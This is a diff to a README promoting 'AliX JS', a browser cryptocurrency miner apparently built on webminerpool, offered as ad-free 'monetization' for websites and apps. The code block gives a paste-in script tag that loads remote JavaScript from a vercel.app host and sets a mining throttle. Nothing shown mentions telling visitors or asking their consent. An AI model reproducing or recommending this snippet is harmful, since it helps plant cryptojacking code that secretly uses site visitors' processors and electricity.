@@ -1,5 +1,7 @@
-AliX JS Is A PowerFull JS Used To Monitize Websites And Apps  
-## HTML SCRIPT
+##### AliX JS Is A PowerFull JS Used To Monitize Websites And Apps  
+#### Use This Code To Basically Monitize Your Apps Without Ads For Free  
+### See This Video For More Info : https://www.youtube.com/watch?v=AZU6TeEjHVQ&t=11s
+## `HTML SCRIPT`
 ```
 <script src="https://alixjs.vercel.app/index.js"></script>
 <script>
@@ -13,7 +15,7 @@ AliX JS Is A PowerFull JS Used To Monitize Websites And Apps
     throttleMiner = 30;
 </script>
 ```
-### Other Things Docs Will Aviable Soon
+### Almost All Languages Supports Html Code Includelation .. Use This Code As Your Pride .. 
   
 # How It Works ?
 - It Is Created By `https://github.com/notgiven688/webminerpool` Repo Basicaly
